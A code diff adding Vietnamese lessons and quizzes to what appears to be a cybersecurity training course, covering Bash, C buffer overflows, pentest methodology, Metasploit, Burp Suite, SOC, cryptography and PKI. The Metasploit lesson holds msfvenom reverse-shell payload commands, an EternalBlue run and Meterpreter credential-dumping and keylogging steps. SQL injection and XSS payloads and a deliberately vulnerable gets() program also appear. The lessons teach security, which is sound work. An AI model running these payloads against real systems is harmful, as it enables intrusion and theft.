@@ -1038,6 +1038,181 @@ SELECT * FROM users WHERE username='admin' --' AND password='abc123'
           explanation: "-- là comment trong SQL, Prepared Statements tách dữ liệu khỏi câu lệnh."
         }
       },
+      {
+        id: "adv-lesson-1-4",
+        title: "Bash Scripting — 'tự động hóa vũ khí'",
+        summary: "Bash là ngôn ngữ kịch bản của Linux. Viết script tự động quét mạng, phân tích log, brute force.",
+        analogy: "Bash giống như điều khiển từ xa vạn năng — thay vì bấm từng nút trên TV (gõ từng lệnh), bạn lập trình cả chuỗi hành động chỉ bằng một nút bấm (chạy script).",
+        content: `## Bash Scripting cho Security
+
+Bash (Born Again SHell) là ngôn ngữ kịch bản mặc định trên Linux. Mọi pentester đều phải thành thạo.
+
+### Cấu trúc script cơ bản:
+\`\`\`bash
+#!/bin/bash
+# Đây là comment
+echo "Hello, CyberShield!"
+
+# Biến
+TARGET="192.168.1.1"
+echo "Đang quét: $TARGET"
+
+# Vòng lặp
+for port in 22 80 443 3306; do
+    echo "Kiểm tra port $port..."
+done
+\`\`\`
+
+### Script tự động quét subnet:
+\`\`\`bash
+#!/bin/bash
+# Script: scan_subnet.sh
+# Cách dùng: ./scan_subnet.sh 192.168.1
+
+SUBNET=$1
+echo "[*] Scanning subnet $SUBNET.0/24 ..."
+
+for ip in $(seq 1 254); do
+    ping -c 1 -W 1 "$SUBNET.$ip" &>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "[+] $SUBNET.$ip is ALIVE"
+    fi
+done
+\`\`\`
+
+### Script phân tích log brute-force:
+\`\`\`bash
+#!/bin/bash
+# Phân tích /var/log/auth.log tìm brute-force SSH
+
+LOG="/var/log/auth.log"
+echo "[*] Phân tích log SSH brute-force..."
+grep "Failed password" "$LOG" | awk '{print $11}' | sort | uniq -c | sort -nr | head -10
+\`\`\`
+
+### 3 kỹ thuật Bash security PHẢI biết:
+| Kỹ thuật | Lệnh | Mục đích |
+|---|---|---|
+| Lọc log | \`grep, awk, sed\` | Tìm dấu hiệu tấn công |
+| Tự động hóa | \`cron, at\` | Chạy script định kỳ |
+| Parsing | \`cut, tr, sort, uniq\` | Xử lý dữ liệu dạng cột |
+
+### Thực hành trên Terminal:
+\`\`\`bash
+# 1. Tạo script đầu tiên
+echo '#!/bin/bash' > myscript.sh
+echo 'echo "Xin chao CyberShield!"' >> myscript.sh
+chmod +x myscript.sh
+./myscript.sh
+
+# 2. Kiểm tra IP của bạn
+curl -s ifconfig.me
+
+# 3. Đếm số dòng trong file log
+wc -l /var/log/syslog
+\`\`\``,
+        estMinutes: 10,
+        order: 4,
+        exercise: {
+          type: "multiple-choice",
+          question: "Bạn muốn tìm tất cả địa chỉ IP đã brute-force SSH từ file auth.log. Dùng lệnh nào?",
+          options: [
+            "A. grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr",
+            "B. cat /var/log/auth.log | head -100",
+            "C. ls -la /var/log/",
+            "D. ping google.com",
+          ],
+          correctAnswer: "A",
+          explanation: "Câu A: grep lọc dòng 'Failed password', awk lấy cột IP thứ 11, sort|uniq đếm số lần, sort -nr sắp xếp từ cao đến thấp."
+        }
+      },
+      {
+        id: "adv-lesson-1-5",
+        title: "C/C++ — 'hiểu sâu bộ nhớ và khai thác'",
+        summary: "C là ngôn ngữ gần với hệ điều hành nhất. Hiểu C = hiểu buffer overflow, ROP, và reverse engineering.",
+        analogy: "C/C++ giống như bản thiết kế chi tiết của một tòa nhà (cấp phát bộ nhớ, con trỏ, địa chỉ). Python là người dùng chỉ cần biết công tắc đèn ở đâu. Hacker giỏi phải đọc được bản thiết kế.",
+        content: `## C/C++ cho Binary Exploitation
+
+Hầu hết lỗ hổng bảo mật nghiêm trọng đều đến từ C/C++ — buffer overflow, use-after-free, heap overflow.
+
+### Con trỏ (Pointer) — trái tim của C:
+\`\`\`c
+#include <stdio.h>
+
+int main() {
+    int secret = 1337;          // Biến trên stack
+    int *ptr = &secret;         // Con trỏ trỏ đến địa chỉ của secret
+    
+    printf("Gia tri: %d\\n", secret);   // 1337
+    printf("Dia chi: %p\\n", ptr);      // 0x7fff...
+    printf("Gia tri qua ptr: %d\\n", *ptr); // 1337
+    
+    return 0;
+}
+\`\`\`
+
+### Buffer Overflow — lỗ hổng kinh điển:
+\`\`\`c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable() {
+    char buffer[16];            // Chỉ 16 bytes
+    printf("Nhap du lieu: ");
+    gets(buffer);               // KHÔNG GIỚI HẠN độ dài!
+    printf("Ban da nhap: %s\\n", buffer);
+}
+
+int main() {
+    vulnerable();
+    return 0;
+}
+\`\`\`
+
+Nếu nhập hơn 16 ký tự, dữ liệu tràn vào vùng nhớ kế bên — hacker có thể ghi đè địa chỉ trả về (return address).
+
+### Stack Memory Layout:
+\`\`\`
+Địa chỉ cao
++------------------+
+| Return Address   |  ← Hacker muốn ghi đè vào đây
++------------------+
+| Saved EBP        |
++------------------+
+| buffer[0..15]    |  ← Nhập dữ liệu từ đây
++------------------+
+Địa chỉ thấp
+\`\`\`
+
+### Các lỗ hổng C/C++ phổ biến:
+| Lỗ hổng | Nguyên nhân | Hậu quả |
+|---|---|---|
+| Buffer Overflow | Không kiểm tra độ dài input | RCE (Remote Code Execution) |
+| Use-After-Free | Dùng con trỏ sau khi free | Tấn công heap |
+| Integer Overflow | Số vượt quá giới hạn | Logic lỗi, bypass kiểm tra |
+| Format String | Dùng printf(user_input) | Rò rỉ bộ nhớ, ghi đè |
+
+### Thực hành an toàn:
+\`\`\`bash
+# Biên dịch chương trình C
+gcc -o vuln vuln.c -fno-stack-protector -z execstack
+
+# Kiểm tra các cơ chế bảo vệ
+checksec --file=vuln
+
+# Debug với GDB
+gdb ./vuln
+(gdb) disassemble main
+\`\`\``,
+        estMinutes: 12,
+        order: 5,
+        exercise: {
+          type: "fill-blank",
+          question: "Lỗ hổng _____ xảy ra khi nhập dữ liệu vượt quá kích thước vùng đệm. Hàm _____ trong C là nguy hiểm nhất vì không kiểm tra độ dài. Công cụ _____ dùng để debug binary.",
+          correctAnswer: ["buffer overflow", "gets", "GDB"],
+          explanation: "Buffer overflow = tràn bộ đệm. gets() không giới hạn input. GDB = GNU Debugger."
+        }
+      },
     ],
   },
   {
@@ -1545,6 +1720,432 @@ crontab -e
           ],
           correctAnswer: ["b", "f", "e", "d", "c", "a"],
           explanation: "IR đúng: Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned"
+        }
+      },
+    ],
+  },
+  {
+    id: "adv-module-5",
+    title: "Penetration Testing",
+    description: "Phương pháp luận PTES, Reconnaissance, Exploitation, Post-exploitation, Báo cáo.",
+    goal: "Thực hiện được một bài pentest từ A-Z trong môi trường lab.",
+    order: 5,
+    lessons: [
+      {
+        id: "adv-lesson-5-1",
+        title: "Phương pháp luận Pentest — 'bản đồ tấn công'",
+        summary: "Pentest có 7 giai đoạn: Tiếp nhận → Recon → Scanning → Exploit → Post-exploit → Báo cáo.",
+        analogy: "Pentest giống như một phi vụ heist trong phim: Nhận hợp đồng (xác định mục tiêu) → Do thám (Recon) → Vẽ bản đồ (Scanning) → Đột nhập (Exploit) → Lấy đồ (Post-exploit) → Rút lui (Báo cáo).",
+        content: `## Phương pháp luận Pentest
+
+### 7 giai đoạn của PTES (Penetration Testing Execution Standard):
+
+| Giai đoạn | Công việc | Tool |
+|---|---|---|
+| 1. Pre-engagement | Ký hợp đồng, xác định scope | - |
+| 2. Intelligence Gathering | Thu thập thông tin OSINT | Maltego, theHarvester |
+| 3. Threat Modeling | Xác định vector tấn công | - |
+| 4. Vulnerability Analysis | Quét lỗ hổng | Nessus, OpenVAS |
+| 5. Exploitation | Khai thác lỗ hổng | Metasploit, Burp Suite |
+| 6. Post-Exploitation | Leo thang, duy trì truy cập | Mimikatz, Netcat |
+| 7. Reporting | Viết báo cáo | - |
+
+### OSINT (Open Source Intelligence):
+Thu thập thông tin từ nguồn mở trước khi tấn công:
+\`\`\`bash
+# Tìm subdomain
+theHarvester -d example.com -l 100 -b google
+
+# Tìm thông tin DNS
+dig example.com ANY
+nslookup example.com
+
+# Tìm email nhân viên
+theHarvester -d example.com -b linkedin
+\`\`\`
+
+### Quét lỗ hổng với Nmap:
+\`\`\`bash
+# Quét toàn diện
+nmap -sS -sV -O -A -T4 target.com
+
+# Quét với script mặc định
+nmap -sC target.com
+
+# Quét tìm lỗ hổng
+nmap --script vuln target.com
+\`\`\`
+
+### Nguyên tắc đạo đức:
+- **Luôn có authorization bằng văn bản**
+- **Không vượt quá scope đã thỏa thuận**
+- **Bảo mật dữ liệu khách hàng**
+- **Báo cáo trung thực, không che giấu lỗi**`,
+        estMinutes: 12,
+        order: 1,
+        exercise: {
+          type: "ordering",
+          question: "Sắp xếp đúng trình tự 7 giai đoạn PTES:",
+          items: [
+            { id: "a", text: "Exploitation" },
+            { id: "b", text: "Reporting" },
+            { id: "c", text: "Intelligence Gathering" },
+            { id: "d", text: "Post-Exploitation" },
+            { id: "e", text: "Vulnerability Analysis" },
+            { id: "f", text: "Pre-engagement" },
+            { id: "g", text: "Threat Modeling" },
+          ],
+          correctAnswer: ["f", "c", "g", "e", "a", "d", "b"],
+          explanation: "PTES: Pre-engagement → Intelligence Gathering → Threat Modeling → Vulnerability Analysis → Exploitation → Post-Exploitation → Reporting"
+        }
+      },
+      {
+        id: "adv-lesson-5-2",
+        title: "Khai thác với Metasploit",
+        summary: "Metasploit là framework khai thác lỗ hổng số 1 thế giới. Học cách dùng msfconsole.",
+        analogy: "Metasploit giống như kho vũ khí bí mật của James Bond — thay vì phải tự chế tạo từng vũ khí (viết exploit), bạn chỉ cần chọn đúng vũ khí cho nhiệm vụ.",
+        content: `## Metasploit Framework
+
+### Cấu trúc cơ bản:
+\`\`\`
+msfconsole
+msf6 > search type:exploit platform:windows CVE-2021
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > show options
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.1.10
+msf6 > exploit
+\`\`\`
+
+### Các khái niệm:
+| Thuật ngữ | Ý nghĩa |
+|---|---|
+| Exploit | Mã khai thác lỗ hổng |
+| Payload | Mã chạy sau khi khai thác thành công |
+| Meterpreter | Payload mạnh mẽ nhất — shell tương tác |
+| LHOST/RHOST | IP máy tấn công/máy nạn nhân |
+| LPORT/RPORT | Port máy tấn công/máy nạn nhân |
+
+### Tạo reverse shell với msfvenom:
+\`\`\`bash
+# Windows executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
+
+# Linux ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
+
+# PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
+\`\`\`
+
+### Post-exploitation với Meterpreter:
+\`\`\`
+meterpreter > sysinfo          # Thông tin hệ thống
+meterpreter > getuid           # User hiện tại
+meterpreter > getsystem        # Leo thang lên SYSTEM
+meterpreter > hashdump         # Lấy password hashes
+meterpreter > screenshot       # Chụp màn hình
+meterpreter > keyscan_start    # Keylogger
+meterpreter > shell            # Mở shell cmd
+meterpreter > download file    # Tải file về
+meterpreter > upload file      # Đẩy file lên
+\`\`\``,
+        estMinutes: 12,
+        order: 2,
+        exercise: {
+          type: "multiple-choice",
+          question: "Muốn tạo file EXE chứa reverse shell Meterpreter gửi cho nạn nhân, dùng lệnh nào?",
+          options: [
+            "A. msfvenom -p windows/meterpreter/reverse_tcp LHOST=... LPORT=... -f exe > shell.exe",
+            "B. gcc -o shell.exe shell.c",
+            "C. ping -t 10.0.0.1",
+            "D. nmap -sS 192.168.1.1",
+          ],
+          correctAnswer: "A",
+          explanation: "msfvenom tạo payload tùy chỉnh. -p chọn payload, -f exe xuất ra EXE."
+        }
+      },
+      {
+        id: "adv-lesson-5-3",
+        title: "Web Pentest với Burp Suite",
+        summary: "Burp Suite là proxy bắt request/respone để phân tích và tấn công web. 90% pentest web dùng Burp.",
+        analogy: "Burp Suite giống máy chụp X-quang cho website — bạn nhìn thấy mọi thứ bên trong: request, response, cookie, parameter, header.",
+        content: `## Web Pentest với Burp Suite
+
+### Các component chính:
+| Component | Chức năng |
+|---|---|
+| Proxy | Bắt request/respone giữa browser và server |
+| Repeater | Gửi lại request đã chỉnh sửa |
+| Intruder | Tự động fuzzing parameter |
+| Decoder | Mã hóa/giải mã dữ liệu |
+| Sequencer | Phân tích tính ngẫu nhiên của token |
+| Scanner | Tự động quét lỗ hổng (bản Pro) |
+
+### Quy trình web pentest cơ bản:
+\`\`\`
+1. Cấu hình browser proxy → 127.0.0.1:8080
+2. Cài CA certificate → xem HTTPS
+3. Duyệt web → Burp bắt request
+4. Gửi request sang Repeater
+5. Sửa parameter → test lỗi
+6. Dùng Intruder → brute force parameter
+\`\`\`
+
+### Các lỗ hổng web thường gặp:
+| Lỗ hổng | Cách test với Burp |
+|---|---|
+| SQL Injection | Gõ ' OR 1=1 -- vào ô username |
+| XSS | Gõ <script>alert(1)</script> |
+| IDOR | Sửa ID trong request parameter |
+| CSRF | Kiểm tra thiếu token |
+| SSTI | Gõ {{7*7}} vào template |
+
+### Ví dụ test SQL Injection:
+\`\`\`
+Request gốc:
+POST /login HTTP/1.1
+username=admin&password=secret
+
+Request đã chỉnh sửa:
+POST /login HTTP/1.1
+username=admin' OR '1'='1&password=secret
+\`\`\`
+
+### Lab thực hành:
+\`\`\`bash
+# Dùng curl tương tự Burp Repeater
+curl -X POST https://target.com/login \
+  -d "username=admin' OR '1'='1&password=test"
+\`\`\``,
+        estMinutes: 10,
+        order: 3,
+        exercise: {
+          type: "true-false",
+          question: "Đánh giá về Web Pentest:",
+          items: [
+            { id: "a", text: "Burp Suite cần cài CA certificate để bắt HTTPS" },
+            { id: "b", text: "Intruder dùng để gửi request thủ công từng cái một" },
+            { id: "c", text: "IDOR là lỗi cho phép truy cập tài nguyên không thuộc quyền" },
+          ],
+          correctAnswer: ["true", "false", "true"],
+          explanation: "CA cert cần để giải mã HTTPS. Intruder là tự động hóa, không phải thủ công. IDOR = Insecure Direct Object Reference."
+        }
+      },
+    ],
+  },
+  {
+    id: "adv-module-6",
+    title: "SOC & Mã hóa chuyên sâu",
+    description: "Security Operations Center, SIEM, Phân tích log, Mật mã học, Public Key Infrastructure.",
+    goal: "Vận hành SOC và hiểu sâu về mã hóa bảo vệ dữ liệu.",
+    order: 6,
+    lessons: [
+      {
+        id: "adv-lesson-6-1",
+        title: "SOC & SIEM — 'trung tâm chỉ huy' an ninh",
+        summary: "SOC là trung tâm giám sát an ninh 24/7. SIEM là hệ thống thu thập và phân tích log tập trung.",
+        analogy: "SOC giống như trung tâm chỉ huy NASA — hàng trăm màn hình hiển thị dữ liệu từ khắp nơi, các chuyên viên phân tích từng cảnh báo để phát hiện 'thiên thạch' (tấn công) trước khi nó đâm vào Trái Đất.",
+        content: `## SOC & SIEM
+
+### SOC là gì?
+Security Operations Center — đội ngũ bảo mật giám sát 24/7, phát hiện và ứng phó sự cố.
+
+### Cấu trúc SOC:
+| Vai trò | Trách nhiệm |
+|---|---|
+| Tier 1 (Analyst) | Theo dõi alert, phân loại, escalate |
+| Tier 2 (Hunter) | Điều tra sâu, Threat Hunting |
+| Tier 3 (Lead) | Phân tích malware, IR phức tạp |
+| SOC Manager | Quản lý đội, báo cáo CISO |
+
+### SIEM — Trái tim của SOC:
+- **Splunk** — SIEM số 1 thế giới (đắt nhất)
+- **ELK Stack** — Elasticsearch, Logstash, Kibana (open source)
+- **QRadar** — IBM SIEM
+- **Wazuh** — Open source SIEM + EDR
+
+### Cách phân tích alert trong SIEM:
+\`\`\`sql
+-- Splunk SPL: Tìm failed login hàng loạt
+index=windows EventCode=4625
+| stats count by Account_Name, Source_Network_Address
+| where count > 10
+| sort -count
+
+-- ELK Query: Tìm kết nối đến IP độc hại
+source.ip: "10.0.0.*" AND destination.ip: "185.220.*"
+\`\`\`
+
+### Playbook phân tích alert:
+\`\`\`
+ALERT: Failed SSH login > 10 lần trong 5 phút
+
+1. CHECK: Source IP - internal hay external?
+2. CHECK: Target - server critical?
+3. CHECK: User account - tồn tại không?
+4. ACT: Nếu external → block IP trên firewall
+5. ACT: Nếu internal → check máy đó có malware?
+6. REPORT: Ghi nhận vào case IR
+\`\`\`
+
+### 3 loại log quan trọng nhất:
+- **Windows Event Log** (Security log 4624, 4625, 4688)
+- **Linux Auth Log** (/var/log/auth.log)
+- **Web Server Log** (Apache/Nginx access.log)`,
+        estMinutes: 12,
+        order: 1,
+        exercise: {
+          type: "multiple-choice",
+          question: "Trong SOC, Tier 1 Analyst phát hiện alert Failed Login SSH hàng loạt. Hành động ĐẦU TIÊN là gì?",
+          options: [
+            "A. Gọi điện báo CISO ngay lập tức",
+            "B. Kiểm tra Source IP: internal hay external?",
+            "C. Format ổ cứng server",
+            "D. Reset password toàn bộ công ty",
+          ],
+          correctAnswer: "B",
+          explanation: "Phân tích source IP trước: external = tấn công từ ngoài (block firewall), internal = máy đã bị compromise."
+        }
+      },
+      {
+        id: "adv-lesson-6-2",
+        title: "Mật mã học — 'khoa học giữ bí mật'",
+        summary: "Mã hóa đối xứng, bất đối xứng, hash, chữ ký số — nền tảng của mọi giao thức bảo mật.",
+        analogy: "Mật mã học giống như két sắt ngân hàng: Mã hóa đối xứng là két có 1 chìa (cả khóa và mở). Mã hóa bất đối xứng là két có 2 chìa — 1 để khóa (public), 1 để mở (private). Hash là máy đo vân tay — không thể 'giải ngược'.",
+        content: `## Mật mã học (Cryptography)
+
+### 3 trụ cột của mật mã:
+1. **Mã hóa (Encryption)** — Giữ bí mật
+2. **Hash (Hashing)** — Đảm bảo toàn vẹn
+3. **Chữ ký số (Digital Signature)** — Xác thực nguồn gốc
+
+### Mã hóa đối xứng (Symmetric):
+\`\`\`bash
+# Mã hóa file với AES (OpenSSL)
+openssl enc -aes-256-cbc -salt -in secret.txt -out secret.enc -k "password"
+
+# Giải mã
+openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -k "password"
+\`\`\`
+
+### Mã hóa bất đối xứng (Asymmetric):
+\`\`\`bash
+# Tạo cặp key RSA
+openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
+openssl rsa -pubout -in private.pem -out public.pem
+
+# Mã hóa với public key (chỉ private key mở được)
+openssl pkeyutl -encrypt -pubin -inkey public.pem -in secret.txt -out secret.enc
+
+# Giải mã với private key
+openssl pkeyutl -decrypt -inkey private.pem -in secret.enc -out secret.txt
+\`\`\`
+
+### Hash — 'dấu vân tay' của dữ liệu:
+\`\`\`bash
+# Tính hash SHA256
+sha256sum file.exe
+
+# MD5 (cũ, không an toàn)
+md5sum file.exe
+
+# So sánh file gốc và file tải về
+echo "abc123...  file.exe" | sha256sum -c
+\`\`\`
+
+### Ứng dụng trong thực tế:
+| Kỹ thuật | Dùng trong |
+|---|---|
+| AES-256 | Mã hóa ổ cứng (BitLocker, FileVault) |
+| RSA-2048 | HTTPS, SSH, Email encryption |
+| SHA-256 | Blockchain, Xác thực file tải về |
+| HMAC | API authentication (JWT) |`,
+        estMinutes: 12,
+        order: 2,
+        exercise: {
+          type: "match",
+          question: "Ghép thuật toán với ứng dụng:",
+          items: [
+            { id: "a", text: "AES-256" },
+            { id: "b", text: "RSA-2048" },
+            { id: "c", text: "SHA-256" },
+          ],
+          options: ["Mã hóa ổ cứng", "HTTPS handshake", "Xác thực file tải về", "Gửi email"],
+          correctAnswer: ["Mã hóa ổ cứng", "HTTPS handshake", "Xác thực file tải về"],
+          explanation: "AES = mã hóa ổ cứng (đối xứng). RSA = HTTPS (bất đối xứng). SHA-256 = hash xác thực file."
+        }
+      },
+      {
+        id: "adv-lesson-6-3",
+        title: "PKI & Chứng chỉ số — 'hệ thống căn cước' Internet",
+        summary: "PKI là hạ tầng khóa công khai — nền tảng của HTTPS, email ký số, và mọi giao dịch an toàn.",
+        analogy: "PKI giống như hệ thống căn cước công dân: CA (Certificate Authority) là bộ công an cấp CMND. Chứng chỉ số là CMND của bạn. Khi bạn truy cập website, trình duyệt kiểm tra 'CMND' của server để đảm bảo nó không giả mạo.",
+        content: `## PKI & Chứng chỉ số
+
+### Thành phần của PKI:
+| Thành phần | Vai trò |
+|---|---|
+| CA (Certificate Authority) | Tổ chức cấp chứng chỉ (DigiCert, Let's Encrypt) |
+| Certificate | Chứng chỉ số — chứa public key + thông tin |
+| CRL/OCSP | Danh sách thu hồi chứng chỉ |
+| Root CA | CA gốc — được trust mặc định trong OS/browser |
+
+### Quy trình HTTPS hoạt động:
+\`\`\`
+1. Browser kết nối https://example.com
+2. Server gửi certificate + public key
+3. Browser kiểm tra certificate:
+   - Có do CA uy tín cấp không?
+   - Còn hạn không?
+   - Domain name khớp không?
+4. Nếu OK → tạo symmetric key, mã hóa bằng public key
+5. Server giải mã bằng private key → bắt đầu truyền mã hóa
+\`\`\`
+
+### Các loại chứng chỉ:
+| Loại | Xác thực | Giá | Dùng cho |
+|---|---|---|---|
+| DV (Domain Validated) | Chủ domain | Miễn phí (Let's Encrypt) | Blog, cá nhân |
+| OV (Organization Validated) | Doanh nghiệp | ~$200/năm | Doanh nghiệp |
+| EV (Extended Validation) | Doanh nghiệp + pháp lý | ~$400/năm | Ngân hàng, lớn |
+
+### Tạo chứng chỉ tự ký (Self-signed):
+\`\`\`bash
+# Tạo private key + certificate (dùng cho lab)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
+
+# Xem thông tin certificate
+openssl x509 -in cert.pem -text -noout
+
+# Kiểm tra kết nối HTTPS
+openssl s_client -connect example.com:443
+\`\`\`
+
+### Let's Encrypt — chứng chỉ miễn phí cho mọi người:
+\`\`\`bash
+# Cài certbot
+sudo apt install certbot python3-certbot-nginx
+
+# Lấy chứng chỉ
+sudo certbot --nginx -d example.com -d www.example.com
+
+# Tự động gia hạn
+sudo certbot renew --dry-run
+\`\`\``,
+        estMinutes: 10,
+        order: 3,
+        exercise: {
+          type: "true-false",
+          question: "Đánh giá về PKI:",
+          items: [
+            { id: "a", text: "Let's Encrypt cấp chứng chỉ DV miễn phí" },
+            { id: "b", text: "Private key có thể chia sẻ công khai" },
+            { id: "c", text: "Certificate hết hạn sẽ bị browser báo lỗi" },
+          ],
+          correctAnswer: ["true", "false", "true"],
+          explanation: "Let's Encrypt cấp DV free. Private key phải GIỮ BÍ MẬT. Hết hạn = browser báo lỗi."
         }
       },
     ],
